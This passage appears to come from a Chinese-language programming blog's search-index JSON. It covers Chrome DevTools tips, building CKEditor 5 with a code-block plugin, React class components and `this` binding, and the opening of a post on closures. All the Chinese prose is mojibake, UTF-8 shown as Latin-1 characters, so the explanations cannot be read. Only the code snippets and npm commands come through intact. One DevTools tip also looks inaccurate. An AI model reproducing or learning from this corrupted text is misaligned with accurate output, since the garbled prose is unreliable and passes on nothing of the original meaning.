åå¥½èªè¨€ï¼ˆæœ‰å„ªå…ˆåº¦ï¼‰ï¼Œserver è¦è‡ªå·±æ ¹æ“šåå¥½èªè¨€ä¾†å¯¦ä½œå›å‚³ä»€éº¼å…§å®¹ã€‚ user-agent =&gt; ä½¿ç”¨è€…çš„ç€è¦½å™¨æ˜¯å“ªå€‹ï¼Œè·Ÿä¸€äº›é¡å¤–è³‡è¨Šã€‚ X- é–‹é ­çš„ header æ˜¯ä»€éº¼ï¼Ÿæ‡‰è©²æ˜¯ Extension çš„æ„æ€ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯è‡ªå·±é¡å¤–åŠ ä¸Šçš„ ã€Œresponse headerã€ï¼Œå¦‚æœä¸æ˜¯ X- é–‹é ­çš„å°±ä»£è¡¨æ˜¯ã€Œä¸€å®šè¦æœ‰çš„ headerã€ã€‚ å¦‚æœæ˜¯ POST requestä½ å¯ä»¥åœ¨ devetool æ‰“é–‹ payload ä¾†æŸ¥çœ‹ POST éå»çš„å…§å®¹æ˜¯ä»€éº¼ã€‚ å†·çŸ¥è­˜ æŒ‰ä¸‹ enter æœƒç›´æ¥é€å‡ºï¼Œæ‰€ä»¥è¦æ”¹æˆ shift + enter console ä¸­æ¯åŸ·è¡Œä¸€å€‹æŒ‡ä»¤éƒ½æœƒæœ‰ä¸€å€‹å°æ‡‰çš„å›å‚³å€¼ï¼Œ &gt; ä»£è¡¨åŸ·è¡Œçš„æŒ‡ä»¤ï¼Œ&lt; ä»£è¡¨è©²æŒ‡ä»¤çš„å›å‚³å€¼ï¼ˆæ‰€ä»¥å¦‚æœä½ åœ¨ console ä¸‹çš„æŒ‡ä»¤æ²’æœ‰å›å‚³å€¼ï¼Œå°±æœƒä¸€ç›´çœ‹åˆ° undefinedï¼‰ é¸åˆ°ä¸€å€‹ element å¾ŒæŒ‰ä¸‹ hï¼ŒChrome å°±æœƒè‡ªå‹•å¹«ä½ åŠ ä¸Š display: hide çš„ class","link":"/2021/12/20/chorme-devtool/"},{"title":"CKEditor çš„ä½¿ç”¨æ–¹æ³•","text":"é‚Šåšç­†è¨˜é‚Šè¤‡ç¿’ã€‚ ç°¡è¿°CKEditor æ˜¯ä¸€å€‹æ‰€è¦‹å³æ‰€å¾—çš„æ–‡å­—ç·¨è¼¯å™¨ï¼Œä¸»è¦ç”¨é€”æ˜¯çµ¦ä½¿ç”¨è€…ç·¨è¼¯æ–‡å­—çš„ç’°å¢ƒï¼Œä¾‹å¦‚éƒ¨è½æ ¼è£¡é¢çš„ç·¨è¼¯æ–‡ç« åŠŸèƒ½ã€‚ CKEditor ç›®å‰ä¸»è¦æœ‰ 4ã€5 å…©å€‹ç‰ˆæœ¬ï¼Œé€™å…©è€…æ˜¯ä¸ç›¸å®¹çš„ï¼Œæ‰€ä»¥é€™ç¯‡æœƒæ‹¿ 5 ä¾†åšæ•™å­¸ã€‚ å‚™è¨» ç•¶åˆè¸©åˆ°çš„é›·åœ¨å®‰è£ç·¨è¼¯å™¨è·Ÿå¥—ä»¶çš„æ™‚å€™è¦ç‰¹åˆ¥æ³¨æ„ã€Œç‰ˆæœ¬ã€ï¼Œå¦‚æœå¥—ä»¶çš„ç‰ˆæœ¬æ¯”ç·¨è¼¯å™¨é‚„æ–°ï¼Œåƒé€™æ¨£ï¼š 123456789{ \"name\": \"@ckeditor/ckeditor5-build-classic\", \"version\": \"19.0.0\", // -&gt; ç·¨è¼¯å™¨çš„ç‰ˆæœ¬ \"description\": \"The classic editor build of CKEditor 5 â€“ the best browser-based rich text editor.\", \"devDependencies\": { \"@ckeditor/ckeditor5-ckfinder\": \"^19.0.0\", \"@ckeditor/ckeditor5-code-block\": \"^32.0.0\", // -&gt; å¥—ä»¶çš„ç‰ˆæœ¬ \"@ckeditor/ckeditor5-core\": \"^19.0.0\", }, ä¹‹å¾Œå¼•å…¥çš„æ™‚å€™å°±æœ‰æ©Ÿæœƒç¢°åˆ° duplicated modulesï¼ˆæ¨¡çµ„é‡è¤‡è¼‰å…¥ï¼‰çš„å•é¡Œã€‚ å¼•å…¥æ–¹å¼ CDN å¼•å…¥ï¼Œå¦‚æœä½ æ²’æœ‰å®‰è£æ“´å……å¥—ä»¶çš„éœ€æ±‚ï¼Œé‚£å°±ç”¨é€™å€‹æ–¹å¼å°±å¥½ï¼š 1&lt;script src=\"https://cdn.ckeditor.com/ckeditor5/32.0.0/classic/ckeditor.js\"&gt;&lt;/script&gt; ä¸‹è¼‰åŸå§‹ç¢¼ ç›®å‰æœ‰äº”å€‹ç‰ˆæœ¬ï¼š classic â€” the Classic editor inline â€” the Inline editor balloon â€” the Balloon editor balloon-block â€” the Balloon block editor decoupled-document â€” the Document editor å¯¦éš›çš„å·®åˆ¥å¯ä»¥å»çœ‹å®˜æ–¹æ–‡ä»¶ï¼Œå› ç‚ºæˆ‘ä¹Ÿæ²’ç‰¹åˆ¥å»çœ‹æ‰€ä»¥ä¸æ¸…æ¥šã€‚ ç¸½ä¹‹ï¼Œæœ€å¤šäººç”¨çš„æ˜¯ classicï¼Œæ‰€ä»¥é€™é‚Šä¹Ÿæœƒæ‹¿é€™å€‹ä¾†ç”¨ã€‚ å…ˆåˆ° é€™é‚Š ä¸‹è¼‰åŸå§‹ç¢¼ï¼š 1git clone https://github.com/ckeditor/ckeditor5.git å‚™è¨»ï¼šç¾åœ¨æ–°ç‰ˆçš„ CKEditor5 å·²ç¶“æ•´åˆåˆ°ä¸€å€‹ Repository äº†ï¼Œä¸è¦ä¸‹è¼‰éŒ¯ç‰ˆæœ¬ï¼Œåƒé€™å€‹å°±æ˜¯èˆŠç‰ˆçš„ï¼šckeditor5-build-classicã€‚ æ¥è‘—åªè¦æ ¹æ“šè·¯å¾‘æŠŠ ckeditor.js å¼•å…¥å°± OK äº†ï¼š 1&lt;script src=\"ckeditor5\\packages\\ckeditor5-build-classic\\build\\ckeditor.js\"&gt;&lt;/script&gt; å•Ÿç”¨æ–¹å¼å¾ˆç°¡å–®ï¼Œåªè¦é€™å…©æ®µ code å°±æå®šï¼š 1&lt;textarea name=\"content\" id=\"editor\"&gt;&lt;/textarea&gt; 12345678&lt;script src=\".ckeditor5\\packages\\ckeditor5-build-classic\\build\\ckeditor.js\"&gt;&lt;/script&gt;&lt;script&gt; ClassicEditor .create(document.querySelector('#editor')) .catch(error =&gt; { console.error(error); });&lt;/script&gt; create æœƒæ ¹æ“š selector ä¾†æ›¿æ›å…ƒç´ ï¼Œæ‰€ä»¥ä¸ä¸€å®šè¦ &lt;textarea&gt;ï¼Œ&lt;div&gt; ä¹Ÿè¡Œã€‚ å¦å¤–é€™å¾ˆæ˜é¡¯æ˜¯å€‹ Promiseï¼Œæ‰€ä»¥ç™¼ç”ŸéŒ¯èª¤çš„è©±å°±æœƒåŸ·è¡Œ catch å€å¡Šï¼Œä½ å¯ä»¥åœ¨é‚£é‚Šçœ‹éŒ¯èª¤è¨Šæ¯ã€‚ ä¸€åˆ‡é †åˆ©çš„è©±ä½ å°±æœƒçœ‹åˆ°é€™å€‹çµæœï¼š å¦‚æœä½ æ²’æœ‰è¦å®‰è£å…¶ä»–å¥—ä»¶çš„è©±ï¼Œåˆ°é€™é‚Šå°±å·®ä¸å¤šäº†ï¼Œæœ‰éœ€æ±‚çš„è©±å°±ç¹¼çºŒçœ‹ä¸‹å»å§ã€‚ å®‰è£æ“´å……åŠŸèƒ½å‚™è¨»ï¼šå®‰è£çš„æ–¹å¼æœ‰å…©å€‹ï¼Œä¸€ç¨®æ˜¯æ”¹æºç¢¼é‡æ–° buildï¼Œå¦ä¸€ç¨®æ˜¯ç›´æ¥åœ¨ JS è£¡é¢æ’å…¥ã€‚é€™è£¡ä»‹ç´¹çš„æ˜¯ç¬¬ä¸€ç¨®ï¼Œå¦‚æœä½ å°ç¬¬äºŒç¨®æ–¹å¼æœ‰èˆˆè¶£åƒè€ƒé€™è£¡ã€‚ä¸éè¦åˆ‡è¨˜ï¼Œé€™å…©å€‹ä¸å¯ä»¥æ··ç”¨ï¼Œå¦å‰‡å¾ˆæœ‰å¯èƒ½å‡ºå•é¡Œã€‚ å‚™è¨»ï¼šå¾Œä¾†ç™¼ç¾æœ‰æ›´ç°¡å–®çš„æ–¹å¼ï¼Œå®˜æ–¹æœ‰æä¾›ç·šä¸Šæ‰“åŒ…çš„æœå‹™ï¼Œå¯ä»¥åƒè€ƒé€™è£¡ æŠŠåŸå§‹ç¢¼ä¸‹è¼‰ä¸‹ä¾†å¾Œï¼Œæœƒçœ‹åˆ° ckeditor5-build-classic é€™å€‹è³‡æ–™å¤¾ï¼Œé€™è£¡èªªæ˜ä¸€ä¸‹è³‡æ–™çµæ§‹ï¼š 12345678910111213141516171819202122232425â”‚ CHANGELOG.mdâ”‚ CONTRIBUTING.mdâ”‚ LICENSE.mdâ”‚ package.json -&gt; CKEditor çš„æ‰€æœ‰è³‡è¨Šï¼ˆå¾ˆé‡è¦ï¼‰â”‚ README.mdâ”‚â”œâ”€â”€â”€.githubâ”‚ PULL_REQUEST_TEMPLATE.mdâ”‚â”œâ”€â”€â”€build -&gt; æ‰“åŒ…å¾Œçš„æª”æ¡ˆâ”‚ â”‚ ckeditor.jsâ”‚ â”‚ ckeditor.js.mapâ”‚ â”‚â”‚ â””â”€â”€â”€translations â”‚â”œâ”€â”€â”€sample -&gt; ç¤ºç¯„æª”æ¡ˆï¼ˆç”¨é€™å€‹èƒ½çœ‹ build å‡ºä¾†çš„ç·¨è¼¯å™¨é•·æ€æ¨£ï¼‰â”‚ index.htmlâ”‚â”œâ”€â”€â”€src -&gt; åŸå§‹ç¢¼ï¼ˆç¨‹å¼çš„é€²å…¥é»ï¼‰â”‚ ckeditor.jsâ”‚â””â”€â”€â”€tests -&gt; æ¸¬è©¦çš„åœ°æ–¹ â”‚ ckeditor.js â”‚ â””â”€â”€â”€manual å…ˆèªªæ˜ä¸€ä¸‹å®‰è£æ“´å……å¥—ä»¶çš„æµç¨‹ï¼š npm install ä½ è¦å®‰è£çš„æ“´å……åŠŸèƒ½ åˆ° src ckeditor.js æŠŠå¥—ä»¶å¼•å…¥è·Ÿè¨­å®š é‡æ–° build ä¸éåœ¨é‚£ä¹‹å‰ï¼Œè«‹å‹™å¿…å…ˆï¼š npm install å®‰è£æ‰€æœ‰ package.json ä¸­çš„å¥—ä»¶ npm install å®‰è£æ‰€æœ‰ package.json ä¸­çš„å¥—ä»¶ npm install å®‰è£æ‰€æœ‰ package.json ä¸­çš„å¥—ä»¶ å› ç‚ºå®ƒæ˜¯ç”¨ webpack ä¾†æ‰“åŒ…çš„ï¼Œæ²’æœ‰å…ˆå®‰è£å¥½çš„è©±ç­‰ä¸€ä¸‹ build çš„æ™‚å€™æœƒå‡ºéŒ¯ã€‚ å®‰è£ Code blocks å¥—ä»¶é€™é‚Šæ‹¿ Code blocks ä¾†ç•¶ç¯„ä¾‹ã€‚ä¸ç®¡å®‰è£å“ªå€‹å¥—ä»¶æµç¨‹éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œæ‰€ä»¥è«‹å‹™å¿…å¼„æ‡‚é€™å€‹æµç¨‹ã€‚ æ¥è‘—ç…§è‘—æ–‡ä»¶çš„å®‰è£èªªæ˜ä¾†åšï¼š 12# åœ¨ ckeditor5-build-classic é€™å€‹è³‡æ–™å¤¾ä¸‹npm install --save @ckeditor/ckeditor5-code-block å®‰è£å®Œå¾Œ package.json å°±æœƒæœ‰ç´€éŒ„äº†ï¼š 123\"dependencies\": { \"@ckeditor/ckeditor5-code-block\": \"^32.0.0\"} å¼•å…¥åŠè¨­å®šå¥—ä»¶æ¥è‘—æ‰“é–‹ src åº•ä¸‹çš„ ckeditor.jsï¼Œæœƒçœ‹åˆ°åƒé€™æ¨£çš„å…§å®¹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// The editor creator to use.import ClassicEditorBase from '@ckeditor/ckeditor5-editor-classic/src/classiceditor';// å¼•å…¥å„ç¨®å¥—ä»¶import Essentials from '@ckeditor/ckeditor5-essentials/src/essentials';import UploadAdapter from '@ckeditor/ckeditor5-adapter-ckfinder/src/uploadadapter';import Autoformat from '@ckeditor/ckeditor5-autoformat/src/autoformat';import Bold from '@ckeditor/ckeditor5-basic-styles/src/bold';import Italic from '@ckeditor/ckeditor5-basic-styles/src/italic';import BlockQuote from '@ckeditor/ckeditor5-block-quote/src/blockquote';....// build æ™‚è¦è¼‰å…¥çš„å¥—ä»¶ClassicEditor.builtinPlugins = [ Essentials, UploadAdapter, Autoformat, Bold, Italic, BlockQuote, CKFinder, EasyImage, Heading, ...];// è¨­å®šç·¨è¼¯å™¨çš„åœ°æ–¹ClassicEditor.defaultConfig = { // å·¥å…·åˆ—è¦é¡¯ç¤ºå“ªäº› item toolbar: { items: [ 'heading', '|', 'bold', 'italic', 'link', ... ] }, // åœ–ç‰‡å·¥å…·çš„è¨­å®š image: { toolbar: [ 'imageStyle:full', 'imageStyle:side', '|', 'imageTextAlternative' ] }, // è¡¨æ ¼å·¥å…·çš„è¨­å®š table: { contentToolbar: [ 'tableColumn', 'tableRow', 'mergeTableCells' ] }, // This value must be kept in sync with the language defined in webpack.config.js. language: 'en'}; é€™é‚Šåªè¦åšå…©ä»¶äº‹æƒ…å°±å¥½ï¼š æŠŠå‰›è¼‰å¥½çš„å¥—ä»¶ import é€²ä¾† æŠŠå¥—ä»¶ç¶åˆ° ClassicEditor.defaultConfig ä¸‹ ä¸€æ¨£æŒ‰ç…§å®˜æ–¹èªªæ˜ä¾†åšï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// The editor creator to use.import ClassicEditorBase from '@ckeditor/ckeditor5-editor-classic/src/classiceditor';// å¼•å…¥å„ç¨®å¥—ä»¶import Essentials from '@ckeditor/ckeditor5-essentials/src/essentials';import UploadAdapter from '@ckeditor/ckeditor5-adapter-ckfinder/src/uploadadapter';import Autoformat from '@ckeditor/ckeditor5-autoformat/src/autoformat';import Bold from '@ckeditor/ckeditor5-basic-styles/src/bold';import Italic from '@ckeditor/ckeditor5-basic-styles/src/italic';import BlockQuote from '@ckeditor/ckeditor5-block-quote/src/blockquote';// å‰›è¼‰å¥½çš„å¥—ä»¶import CodeBlock from '@ckeditor/ckeditor5-code-block/src/codeblock';....// build æ™‚è¦è¼‰å…¥çš„å¥—ä»¶ClassicEditor.builtinPlugins = [ Essentials, UploadAdapter, Autoformat, Bold, Italic, BlockQuote, CKFinder, EasyImage, Heading, CodeBlock, // åŠ é€²å» ...];// è¨­å®šæ¯å€‹å¥—ä»¶çš„é è¨­å€¼ClassicEditor.defaultConfig = { // å·¥å…·åˆ—è¦é¡¯ç¤ºå“ªäº› item toolbar: { items: [ 'heading', '|', 'bold', 'italic', 'link', ... 'codeBlock' // æ–°å¢é€™å€‹æŒ‰éˆ• ] },}; å‚™è¨»ï¼šå¥—ä»¶è¨­å®šçš„éƒ¨åˆ†å»ºè­°åˆ¥å‹•ï¼Œè¦æ”¹çš„è©±å»ä½¿ç”¨ CKEditor çš„é é¢åœ¨æ”¹å°±å¥½ã€‚ é‡æ–°ç·¨è­¯æœ€å¾Œä¸€æ­¥æœ€ç°¡å–®å•¦ï¼Œä¸‹é€™è¡ŒæŒ‡ä»¤å°±å¥½ï¼š 1npm run build æœ€å¾ŒæŠŠç·¨è­¯å®Œçš„ ckeditor.js å¼•å…¥å°±å®Œæˆäº†ã€‚ æ€éº¼å–å¾—ç·¨è¼¯å™¨çš„å…§å®¹ PHP å¦‚æœä½ æ˜¯ç”¨ Form è¡¨å–®ä¾†é€å‡ºå…§å®¹çš„è©±ï¼Œé‚£ä½ å¯ä»¥åœ¨ PHP è£¡é¢æ‹¿è³‡æ–™ï¼š 1234&lt;form method=\"POST\" action=\"result.php\"&gt; &lt;textarea name=\"content\" id=\"editor\"&gt;&lt;/textarea&gt; &lt;button class=\"btn\"&gt;Send&lt;/button&gt;&lt;/form&gt; 12// result.php$content = $_POST['content']; JavaScript å¦‚æœä½ æ˜¯é€é AJAX çš„è©±ï¼Œåƒè€ƒé€™å€‹åšæ³•ï¼š 12&lt;textarea name=\"content\" id=\"editor\"&gt;&lt;/textarea&gt;&lt;button class=\"btn\"&gt;send&lt;/button&gt; 123456789101112131415// å…ˆå®£å‘Šä¸€å€‹è®Šæ•¸ï¼Œç­‰ä¸€ä¸‹è¦å„²å­˜ç·¨è¼¯å™¨çš„å¯¦é«”let editor = undefined;ClassicEditor .create(document.querySelector('#editor')) .then( newEditor =&gt; { // æŒ‡å®šçµ¦è®Šæ•¸ editor = newEditor }) .catch(error =&gt; { console.error(error); });document.querySelector('.btn').addEventListener('click', () =&gt; { // é€™è£¡å°±å¯ä»¥ç”¨ getData ä¾†å–å¾— HTML å…§å®¹ console.log(editor.getData());})","link":"/2022/02/20/ckeditor-usage/"},{"title":"åˆæ¢ Class-component","text":"åˆæ¬¡è¦‹é¢ã€‚ ç°¡è¿°å¯ä»¥å…ˆæ¯”å°ä¸€ä¸‹ function component è·Ÿ class component çš„å·®ç•°ï¼š åœ¨ function componentï¼š ç”¨ return çš„æ±è¥¿ä¾†æ¸²æŸ“å…§å®¹ åœ¨å…ƒä»¶ä¸­ä½¿ç”¨çš„ function æœƒç›´æ¥å®£å‘Šåœ¨è£¡é¢ è¨­ç½® state å¾—é€é useState æ›´æ–° state å¾—é€é useState å›å‚³çš„ setter ä¾†åš åœ¨ class componentï¼š æœƒç”¨ render ä¾†æ¸²æŸ“å…§å®¹ åœ¨å…ƒä»¶ä¸­ä½¿ç”¨çš„ function æœƒå¯«æˆ class çš„ method è¨­ç½® state å¾—é€é constructor çš„ this.state æ›´æ–° state å¾—é€é this.setState ä¾†å‚³å…¥æ–°çš„ state é™¤äº†ä»¥ä¸Šï¼Œclass component é‚„å¿…é ˆæ™‚æ™‚åˆ»åˆ»æ³¨æ„ this å€¼æŒ‡å‘èª°ã€‚ ä¸€å€‹åŸºæœ¬çš„ class component ç¯„ä¾‹é€™æ˜¯ä¸€å€‹ä¸æ­£ç¢ºçš„ç¯„ä¾‹ï¼Œä¸‹é¢æœƒåœ¨åšè§£é‡‹ï¼Œå…ˆçœ‹å°±å°äº†ï¼š 1234567891011121314151617181920212223class Demo extends React.Component { // å…ˆæŠŠåŸæœ¬ React.Component çš„å±¬æ€§å‚³é€²å»ï¼ˆåƒæ˜¯ setState æˆ– life cyecle ä¹‹é¡çš„æ±è¥¿ï¼‰ // æ‰å¯ä»¥æ¥è‘—å¯«è‡ªå·±æ–°å¢çš„å±¬æ€§ constructor (props) { super(props) // åªèƒ½æ˜¯ Object this.state = { counter: 0 } } handleClick () { // å‚³ä¸€å€‹æ–°çš„ state é€²å» this.setState({ // å…ˆæ‹¿åˆ°åŸæœ¬çš„ stateï¼Œå†åŠ ä¸€ counter: this.state.counter + 1 }) } render() { // æŠŠ method ç•¶ä½œ event handler return (&lt;button onClick={this.handleClick}&gt;{this.state.counter}&lt;/button&gt;) }} çœ‹èµ·ä¾†å¥½åƒé‚„è »åˆç†çš„ï¼Ÿä½†æ˜¯ï¼š æœƒç™¼ç¾æ€éº¼é»éƒ½æ²’æœ‰ç”¨ï¼Ÿé€™å°±æ˜¯ this çš„å•é¡Œï¼Œæˆ‘å€‘ä¾†ä¸€æ­¥ä¸€æ­¥åˆ†æçœ‹çœ‹ï¼š this.handleClick çš„ã€Œå€¼ã€æ˜¯ä¸€å€‹ functionï¼ˆé‚„æ²’è¢«åŸ·è¡Œï¼‰ è€Œ handleClick è£¡æœ‰ç”¨åˆ° thisï¼Œå®ƒæœƒæ ¹æ“š handleClick æ€éº¼è¢«å‘¼å«ä¾†æ±ºå®š event handler æ˜¯ä¸€å€‹ callback functionï¼Œç€è¦½å™¨å¹«æˆ‘å€‘åœ¨ä½¿ç”¨è€…é»ä¸‹æŒ‰éˆ•æ™‚å‘¼å«ï¼Œæ‰€ä»¥çµ•å°ä¸æ˜¯ç”± Component ä¾†å‘¼å«çš„ï¼ˆé€™æ˜¯é—œéµé»ï¼‰ å› æ­¤æœ€å¾Œ this å€¼æ²’æœ‰æŒ‡å‘ Componentï¼Œè€Œæ˜¯ undefinedï¼ˆåš´æ ¼æ¨¡å¼ï¼‰ è§£æ±ºé€™ç¨® this è·‘æ‰çš„è¾¦æ³•æœ‰å…©ç¨®ï¼š æ”¹ç”¨ Arrow function çš„å½¢å¼ä¾†å®£å‘Š methodï¼ˆèƒŒå¾Œæ˜¯é€é babel è½‰è­¯çš„ï¼Œä¸æ˜¯åŸç”Ÿèªæ³•ï¼‰ åœ¨ constructor åˆ©ç”¨ bind ä¾†ç¶å®š this å€¼ åœ¨ inline function è£¡ç”¨ Arrow function åŒ…ä½åŸæœ¬çš„ method åœ¨ inline function è£¡ç”¨ bind ä¾†ç¶å®š this å€¼ å…ˆä¾†çœ‹ç¬¬ä¸€ç¨®çš„å¯«æ³•ï¼š 1234567891011121314151617181920class Demo extends React.Component { constructor (props) { super(props) // è¨˜å¾—åªèƒ½æ˜¯ Object this.state = { counter: 0 } } // è¨˜å¾—è¦åŠ ä¸€å€‹ã€Œ=ã€ï¼Œbabel æœƒå¹«ä½ è‡ªå‹•å¹«ä½ è½‰æ› handleClick = () =&gt; { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={this.handleClick}&gt;{this.state.counter}&lt;/button&gt;) }} æ¥è‘—æ˜¯ç¬¬äºŒç¨®ä½œæ³•ï¼š 1234567891011121314151617181920class Demo extends React.Component { constructor (props) { super(props) this.state = { counter: 0 } // è®“ this æ°¸é æŒ‡å‘ Component this.handleClick = this.handleClick.bind(this) } handleClick () { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={this.handleClick}&gt;{this.state.counter}&lt;/button&gt;) }} æ¥è‘—ç¬¬ä¸‰ç¨®ä½œæ³•ï¼š 123456789101112131415161718class Demo extends React.Component { constructor (props) { super(props) this.state = { counter: 0 } } handleClick () { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={() =&gt; this.handleClick()}&gt;{this.state.counter}&lt;/button&gt;) }} é€™é‚Šç”¨ Arrow function çš„å½¢å¼å¯èƒ½æœ‰é»é›£çœ‹æ‡‚ï¼Œä½†å¯«æˆé€™æ¨£ä½ æ‡‰è©²å°±æ‡‚äº†ï¼š 1234567render() { return (&lt;button onClick={ function wrapper () { return this.handleClick() } }&gt;{this.state.counter}&lt;/button&gt;)} å°±æ˜¯ onClick æ™‚å¹«æˆ‘å»å‘¼å« wrapperï¼Œè€Œ wrapper è£¡é¢åˆæœƒåœ¨å‘¼å« this.handleClick é€™æ¨£çš„æ¦‚å¿µã€‚ä½†è¦æ³¨æ„ä¸€å®šè¦ç”¨ arrow function æ‰å¯ä»¥ï¼Œä¸ç„¶ this å€¼ä¸€æ¨£æœƒè·‘æ‰ã€‚ æœ€å¾Œæ˜¯ç¬¬å››ç¨®ä½œæ³•ï¼š 123456789101112131415161718class Demo extends React.Component { constructor (props) { super(props) this.state = { counter: 0 } } handleClick () { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={this.handleClick.bind(this)}&gt;{this.state.counter}&lt;/button&gt;) }} å…¶å¯¦å°±è·Ÿç¬¬äºŒç¨®å·®ä¸å¤šï¼Œéƒ½æ˜¯é€é bind ä¾†ç¶å®š this å€¼ åœ¨ class component æ¥æ”¶ props ä»¥åŠçˆ¶å­æºé€šé€™é‚Šçš„æŠ€å·§å°±æ˜¯ã€Œå“ªè£¡æœƒç”¨åˆ° propsï¼Œå°±åœ¨å“ªé‚Šå–å‡ºã€ï¼Œå¦‚æœåœ¨ render æ™‚æœƒç”¨åˆ°ï¼Œé‚£å°±åœ¨ render è£¡é¢æ‹¿ï¼›å¦‚æœåœ¨æŸå€‹ methods æœƒç”¨åˆ°ï¼Œé‚£å°±åœ¨ methods è£¡é¢æ‹¿ï¼Œä»¥æ­¤é¡æ¨ã€‚ æˆ‘å€‘æƒ³åšå‡ºçš„æ•ˆæœæ˜¯é€™æ¨£ï¼š ä¸€å€‹ç°¡å–®çš„åˆ—è¡¨ï¼ŒæŒ‰ä¸€ä¸‹æŒ‰éˆ•å°±æœƒæ–°å¢ä¸€ç­†è³‡æ–™ã€‚è€Œé€™è£¡çš„å…ƒä»¶é—œä¿‚å¦‚ä¸‹ï¼š Demoï¼ˆè² è²¬ç®¡ç†è³‡æ–™çš„ stateï¼‰ Buttonï¼ˆæŒ‰ä¸‹æŒ‰éˆ•æ™‚è¦æ›´æ–° Demo è£¡çš„ stateï¼‰ Todoï¼ˆæ ¹æ“š Demo çš„ state æ¸²æŸ“åˆ—è¡¨ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Demo extends React.Component { constructor(props) { super(props); this.state = { todos: [], }; } // æ›´æ–° todo çš„ state handleAddTodo = (content) =&gt; { this.setState({ todos: [content, ...this.state.todos], }); }; render() { return ( &lt;div id=\"container\"&gt; // æŠŠ function ç•¶ä½œ props å‚³å…¥ &lt;Button handleAddTodo={this.handleAddTodo} /&gt; {this.state.todos.map((todo) =&gt; ( // æŠŠ todo ç•¶ä½œ props å‚³å…¥ &lt;Todo content={todo} /&gt; ))} &lt;/div&gt; ); }}class Button extends React.Component { handleClick = () =&gt; { // å…ˆæŠŠ props æ‹¿å‡ºä¾† const { handleAddTodo } = this.props; // åŸ·è¡Œ props é€²ä¾†çš„ function handleAddTodo(Math.random()); }; render() { return &lt;button onClick={this.handleClick}&gt;add todo&lt;/button&gt;; }}class Todo extends React.Component { render() { // æ¸²æŸ“æœƒç”¨åˆ°ï¼Œå¾é€™é‚Šæ‹¿å‡ºä¾† const { content } = this.props; return &lt;div&gt;{content}&lt;/div&gt;; }} å¤§è‡´ä¸Šè·Ÿ hook çš„å¯«æ³•å·®ä¸å¤šï¼Œåªæ˜¯è¦ç‰¹åˆ¥æ³¨æ„ this è·Ÿæ‹¿å‡ºä¾†çš„åœ°æ–¹ã€‚ä¹‹æ‰€ä»¥è¦åœ¨æ¯å€‹ç”¨åˆ°çš„åœ°æ–¹éƒ½å–å‡ºï¼Œæ˜¯å› ç‚ºåœ¨ class æ²’è¾¦æ³•é€™æ¨£å¯«ï¼š 123456789class Button extends React.Component { // ä¸€ç¨® class è£¡çš„å…¨åŸŸè®Šæ•¸çš„æ„Ÿè¦ºï¼Œä½†ä¸èƒ½é€™æ¨£å¯« const {prop1, prop2, ...prop3} = this.props render () { // é€™è£¡æ‰å¯ä»¥å®£å‘Šè®Šæ•¸ const {prop1, prop2, ...prop3} = this.props ... }} åªæœ‰åœ¨ method è£¡é¢æ‰èƒ½å®£å‘Šè®Šæ•¸ï¼Œé€™æ˜¯ä¸€å€‹å°ç´°ç¯€ï¼Œè¦å¤šå¤šæ³¨æ„ã€‚ æ”¹è®Š state æ™‚å¯ä»¥ä¸ç®¡æ²’æ”¹åˆ°çš„åœ°æ–¹å‡è¨­ä½ æœ‰ä¸€å€‹ component çš„ state çµæ§‹é•·é€™æ¨£ï¼š 12345this.state = { family: ['sister', 'father', 'mother'], age: [10, 20 ,30], totalCount: 3} ç„¶å¾Œä½ å¯èƒ½æœƒæƒ³åœ¨é»ä¸‹æŸå€‹æŒ‰éˆ•æ™‚ï¼Œæ–°å¢ family çš„éƒ¨åˆ†ï¼š é‚£ä½ æœƒæ€éº¼åšï¼Ÿæˆ‘åŸæœ¬çš„æƒ³æ³•æ˜¯é€™æ¨£ï¼š 123456handleClick = () =&gt; { this.setState({ ...this.state, family: [...this.state.family, Math.random()] });}; å…ˆè¤‡è£½ä¸€ä»½åŸæœ¬çš„ stateï¼Œåœ¨é‡å° family çš„éƒ¨åˆ†åšæ–°å¢ã€‚ ä½†å…¶å¯¦ä¸ç”¨é€™éº¼éº»ç…©ï¼Œåªè¦é€™æ¨£å°±å¥½ï¼š 123456handleClick = () =&gt; { this.setState({ family: [...this.state.family, Math.random()] });}; æ²’æœ‰å‹•åˆ°çš„æ±è¥¿ React æœƒä¿ç•™èµ·ä¾†ï¼Œæ‰€ä»¥ä¸ç”¨é€™éº¼éº»ç…©å”·ï½ ä¸éåœ¨ hook å°±ä¸èƒ½é€™æ¨£åšäº†ï¼Œä¸€å®šè¦çµ¦å®ƒå®Œæ•´çš„ state æ‰è¡Œï¼š 12345678910111213141516171819const [data, setData] = useState({ family: [\"sister\", \"father\", \"mother\"], age: [10, 20, 30], totalCount: 3});// é€™æ¨£å¯ä»¥const handleClick = () =&gt; { setData({ ...data, family: [...data.family, Math.random()] });};// é€™æ¨£ä¸å°const handleClick = () =&gt; { setData({ family: [...data.family, Math.random()] });};","link":"/2022/04/08/class-component-first-meet/"},{"title":"å…ˆç†è§£ä½œç”¨åŸŸè·Ÿå›å‚³å€¼ï¼Œå†ä¾†è«‡é–‰åŒ…ã€‚","text":"çªç„¶æœ‰ä¸€é»æ–°çš„æƒ³æ³•ã€‚ å‰è¨€ä¸Šå€‹æœˆæˆ‘æœ‰å¯«éä¸€ç¯‡ï¼šè«‡è«‡ JS ä¸­çš„ Closureï¼ˆé–‰åŒ…ï¼‰ï¼Œä½†æœ€è¿‘åˆæœ‰äº†ä¸€äº›æ–°æƒ³æ³•ï¼Œæ‰€ä»¥æƒ³åœ¨å¯«ä¸€æ¬¡é—œæ–¼ã€Œé–‰åŒ…ï¼ˆClosureï¼‰ã€é€™å€‹ä¸»é¡Œã€‚ å°±è·Ÿæ¨™é¡Œä¸€æ¨£ï¼Œæˆ‘è¦ºå¾—é–‰åŒ…æ²’æœ‰é‚£éº¼è¤‡é›œï¼Œä½ 